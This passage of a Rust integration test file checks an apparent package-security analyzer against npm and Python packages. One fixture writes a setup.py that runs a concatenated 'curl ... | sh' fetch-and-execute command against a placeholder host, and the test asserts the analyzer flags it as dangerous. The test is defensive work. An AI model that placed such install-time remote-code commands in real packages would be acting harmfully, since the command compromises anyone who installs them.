    assert_eq!(deps["advisory_data"]["package_count"], 6);

    // Unknown arguments are rejected.
    let (is_error, _) = call(
        &client,
        "analyze_npm_package",
        json!({"package_path": path, "bogus": 1}),
    )
    .await;
    assert!(is_error);
    client.cancel().await.unwrap();
}

#[tokio::test]
async fn python_summary_and_scripts_section() {
    let dir = TempDir::new().unwrap();
    let curl = ["cu", "rl http://example.invalid/p.sh | sh"].concat();
    let setup = format!(
        "import os\nfrom setuptools import setup\nos.system('{curl}')\nsetup(name='demo', version='1.0', install_requires=['requests==2.5.0'])\n"
    );
    let path = write(
        dir.path(),
        "demo-1.0.tar.gz",
        &tgz(&[("demo-1.0/setup.py", setup.as_bytes())]),
    );
    let client = client().await;
    let (is_error, text) = call(
        &client,
        "analyze_python_package",
        json!({"package_path": path}),
    )
    .await;
    assert!(!is_error, "{text}");
    let summary: Value = serde_json::from_str(&text).unwrap();
    assert_eq!(summary["package"]["name"], "demo");
    assert_eq!(summary["advisory_data"]["package_count"], 7);
    assert_eq!(summary["dependencies"]["with_advisories"], 1);
    assert!(
        matches!(
            summary["risk"]["level"].as_str(),
            Some("Medium" | "High" | "Critical")
        ),
        "{summary}"
    );
    let (_, text) = call(
        &client,
        "analyze_python_package",
        json!({"package_path": path, "section": "scripts"}),
    )
    .await;
    let scripts: Value = serde_json::from_str(&text).unwrap();
    assert_eq!(scripts["section"], "scripts");
    assert!(!scripts["dangerous_operations"]
        .as_array()
        .unwrap()
        .is_empty());
    client.cancel().await.unwrap();
}
